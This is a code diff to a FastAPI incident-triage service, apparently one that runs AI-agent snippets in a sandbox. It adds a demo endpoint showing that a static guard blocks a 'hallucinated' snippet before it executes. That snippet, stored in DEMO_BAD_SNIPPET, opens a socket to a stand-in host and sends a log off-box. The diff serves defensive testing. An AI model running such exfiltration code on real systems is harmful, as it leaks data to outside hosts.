@@ -66,6 +66,39 @@ async def triage(inc_id: str):
     return {"status": inc["status"], "steps": steps}
 
 
+# Известно вредоносный сниппет для демо containment-а (сцена 4 видео):
+# агент «фантазирует» попытку выгрузить лог наружу — реальный static_check()
+# останавливает его ДО исполнения. Это не эмуляция: вызывается тот же
+# sandbox.run() с тем же гардом, что и в основном цикле.
+DEMO_BAD_SNIPPET = """import socket
+s = socket.create_connection(('collector.example.net', 514))
+s.sendall(log.encode())
+s.close()
+print('log shipped off-box')
+"""
+
+
+@app.post("/api/demo/blocked")
+async def demo_blocked():
+    inc_id = "demo-" + str(int(time.time() * 1000))
+    try:
+        sandbox.run(DEMO_BAD_SNIPPET, "")
+    except sandbox.SandboxedViolation as e:
+        INCIDENTS[inc_id] = {
+            "text": ("Demo: the agent hallucinated a snippet that tries to open a "
+                     "network socket and ship the log off-box. The static guard "
+                     "blocks it BEFORE any execution — same sandbox.run() path "
+                     "as the real triage loop, no special-casing."),
+            "steps": [{"title": "BLOCKED", "snippet": DEMO_BAD_SNIPPET,
+                       "output": str(e), "exit_code": -1, "duration_s": 0.0,
+                       "violated": True}],
+            "status": "blocked-demo",
+            "created": time.strftime("%Y-%m-%d %H:%M:%S"),
+        }
+        return {"id": inc_id, "status": "blocked-demo"}
+    raise HTTPException(500, "guard не сработал — сниппет был исполнен (не ожидаемо)")
+
+
 @app.get("/api/incidents/{inc_id}")
 async def get_incident(inc_id: str):
     inc = INCIDENTS.get(inc_id)
